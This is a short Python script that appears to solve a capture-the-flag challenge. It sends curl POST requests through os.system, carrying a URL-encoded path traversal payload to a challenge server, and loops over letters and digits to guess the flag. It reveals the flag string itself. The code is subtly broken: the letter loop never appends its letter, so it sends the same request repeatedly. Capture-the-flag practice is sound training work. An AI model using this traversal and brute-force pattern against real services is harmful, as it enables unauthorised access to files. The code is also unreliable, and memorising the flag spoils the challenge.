import os
import string
import subprocess
import tempfile

input = "curl \'http://splitline.tw:5000/public_api\' -X POST -H \'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0\' -H \'Accept: */*\' -H \'Accept-Language: en-US,en;q=0.5\' --compressed -H \'Referer: http://splitline.tw:5000/\' -H \'Content-type: application/json\' -H \'Origin: http://splitline.tw:5000\' -H \'Connection: keep-alive\' --data-raw \'{\"text\":\"%2e%2e/looksLikeFlag?flag=FLAG{3asy_p4th_tr4vers4l}"


for w in list(string.ascii_lowercase):
    print(w)
    input2 = "\"}\'"
    os.system(input  + input2)
    print()

for w in range(10):
    print(w)
    a = str(w)
    input2 = "\"}\'"
    os.system(input + a + input2)
    print()